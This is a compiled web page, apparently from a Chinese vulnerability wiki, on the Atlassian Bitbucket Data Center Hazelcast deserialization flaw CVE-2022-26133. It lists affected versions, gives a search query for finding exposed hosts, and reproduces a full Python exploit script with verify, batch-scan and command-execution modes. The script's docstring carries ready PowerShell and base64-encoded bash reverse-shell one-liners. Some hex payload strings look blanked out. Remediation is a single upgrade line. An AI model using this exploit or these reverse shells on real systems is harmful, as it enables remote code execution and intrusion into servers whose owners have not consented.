import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as a,c as d,a as e,b as n,d as t,e as r}from"./app-58e4a7d6.js";const v={},c=r(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Atlassian Bitbucket Data Center 存在远程代码执行漏洞。该漏洞是由于Atlassian Bitbucket Data Center 中的 Hazelcast 接口功能未对用户数据进行有效过滤，导致存在反序列化漏洞而引起的。攻击者利用该漏洞可以构造恶意数据远程执行任意代码。只有当 Atlassian Bitbucket Data Center 以 Cluster 模式安装时，才可能受该漏洞影响。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Atlassian Bitbucket Data Center &gt;= 5.14.x
Atlassian Bitbucket Data Center 6.x
Atlassian Bitbucket Data Center &lt; 7.6.14
Atlassian Bitbucket Data Center &lt; 7.16.x
Atlassian Bitbucket Data Center &lt; 7.17.6
Atlassian Bitbucket Data Center &lt; 7.18.4
Atlassian Bitbucket Data Center &lt; 7.19.4
Atlassian Bitbucket Data Center 7.20.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;ATLASSIAN-Bitbucket&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>exp：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 CVE-2022-26133.py -u http://192.168.110.136:7990 -f target.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#!/usr/bin/env python3
## -*- coding: utf_8 -*-
## @Time    : 2022/5/7 0007 9:58

from urllib.parse import urlparse
import argparse
import requests
import logging
import socket
import time

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

&#39;&#39;&#39;
Atlassian Bitbucket Data Center反序列化漏洞(CVE-2022-26133)

## Windows Reverse Shell(未免杀)
command: powershell -nop -c \\&quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;192.168.1.1&#39;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\&quot;

## Linux Reverse Shell
command: bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}

&#39;&#39;&#39;


class CVE_2022_26133:
    def __init__(self, target):
        parse = urlparse(target)
        self.url = parse.scheme + &quot;://&quot; + parse.netloc
        self.log_init()
        self.timeout = 3
        self.proxies = None
        ## self.proxies = {&quot;http&quot;: &quot;http://127.0.0.1:8888&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8888&quot;}

    def log_init(self):
        LOG_FORMAT = &quot;%(asctime)s - %(levelname)s - %(message)s&quot;
        logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)

    def str_to_hex(self, param):
        ll = []
        for i in param:
            ll.append(hex(ord(i)).split(&quot;x&quot;)[1])
        return &quot;&quot;.join(ll)

    def dec_to_hex(self, param, n):
        if n == 4:
            return &#39;{:04x}&#39;.format(param)
        elif n == 8:
            return &#39;{:08x}&#39;.format(param)

    def get_socket_connect(self):
        try:
            parse = urlparse(self.url)
            target = parse.netloc.split(&quot;:&quot;)[0]
            ## default port
            port = 5701

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(self.timeout)

            sock.connect((target, port))
            return sock
        except Exception as msg:
            logging.critical(&quot;target is not reachable, &quot; + str(msg))

    def generate_payload(self, cluster, command):

        payload = cluster.hex()
        payload += &quot;FFFFFF9C&quot;

        ## yso cb1 payload
        payload += &quotquot;
        payload += self.dec_to_hex((1684 + len(command)), 8)
        payload += &quotquot;
        payload += self.dec_to_hex((len(command)), 4)
        payload += self.str_to_hex(command)
        payload += &quotquot;

        ## logging.info(&quot;payload: &quot; + payload)
        return payload

    def verify(self, Batch=False):

        logging.debug(&quot;Checking &quot; + self.url)

        try:
            sock = self.get_socket_connect()
            if sock is not None:
                ## get ClusterName
                data = &quot;000000027361&quot;
                sock.send(bytes.fromhex(data))
                ClusterName = sock.recv(4) + sock.recv(1024)
                sock.close()

                if len(ClusterName) != 0:
                    logging.info(&quot;\\033[0;36mTarget is vulnerable.\\033[0m&quot;)
                    if Batch != False:
                        with open(&quot;success.txt&quot;, &quot;a+&quot;) as fo:
                            fo.write(self.url + &quot;\\n&quot;)
                        fo.close()

                    return ClusterName

        except Exception as msg:
            logging.critical(msg)

    def exploit(self, command):
        ClusterName = self.verify()
        if ClusterName is not None:
            try:
                sock = self.get_socket_connect()
                if sock is not None:
                    logging.info(&quot;command =&gt; &quot; + command)
                    payload = self.generate_payload(ClusterName, command)

                    sock.send(bytes.fromhex(payload))
                    time.sleep(0.5)
                    res = sock.recv(1024)
                    sock.close()

                    if len(res) != 0:
                        logging.info(&quot;payload send success, check it.&quot;)

            except Exception as msg:
                if isinstance(msg, ConnectionResetError):
                    logging.warning(&quot;ConnectionResetError: Payload maybe execute successful once target is Linux, Check it.&quot;)
                else:
                    logging.critical(msg)


if __name__ == &#39;__main__&#39;:

    parser = argparse.ArgumentParser()
    parser.add_argument(&#39;-u&#39;, dest=&#39;url&#39;, help=&#39;input target url, eg: http://192.168.1.1:7990/&#39;)
    parser.add_argument(&#39;--verify&#39;, action=&#39;store_true&#39;, default=False, help=&#39;verify mode, verify if target is vulnerable.&#39;)
    parser.add_argument(&#39;-c&#39;, dest=&#39;command&#39;, help=&#39;exploit mode, eg: bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}&#39;)
    parser.add_argument(&#39;-f&#39;, dest=&#39;file&#39;, help=&#39;verify targets in the file if vulnerable.&#39;)
    args = parser.parse_args()

    print(&quot;&quot;&quot;
   ______     _______     ____   ___ ____  ____      ____   __   _ __________ 
  / ___\\ \\   / / ____|   |___ \\ / _ \\___ \\|___ \\    |___ \\ / /_ / |___ /___ / 
 | |    \\ \\ / /|  _| _____ __) | | | |__) | __) |____ __) | &#39;_ \\| | |_ \\ |_ \\ 
 | |___  \\ V / | |__|_____/ __/| |_| / __/ / __/_____/ __/| (_) | |___) |__) |
  \\____|  \\_/  |_____|   |_____|\\___/_____|_____|   |_____|\\___/|_|____/____/ 
        &quot;&quot;&quot;)

    if args.verify:
        CVE_2022_26133(args.url).verify()
    elif args.file:
        with open(args.file, &#39;r&#39;) as f:
            targets = f.readlines()
            f.close()
            for target in targets:
                CVE_2022_26133(target.strip()).verify(True)
    elif args.command:
        CVE_2022_26133(args.url).exploit(args.command)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2>`,11),u={href:"https://www.atlassian.com/software/bitbucket/download-archives",target:"_blank",rel:"noopener noreferrer"};function m(F,o){const i=l("ExternalLinkIcon");return a(),d("div",null,[c,e("p",null,[n("当前官方已发布最新版本，建议受影响的用户及时更新升级到最新版本。链接如下："),e("a",u,[n("https://www.atlassian.com/software/bitbucket/download-archives"),t(i)])])])}const C=s(v,[["render",m],["__file","Atlassian Bitbucket Data Center 远程代码执行漏洞 CVE-2022-26133.html.vue"]]);export{C as default};
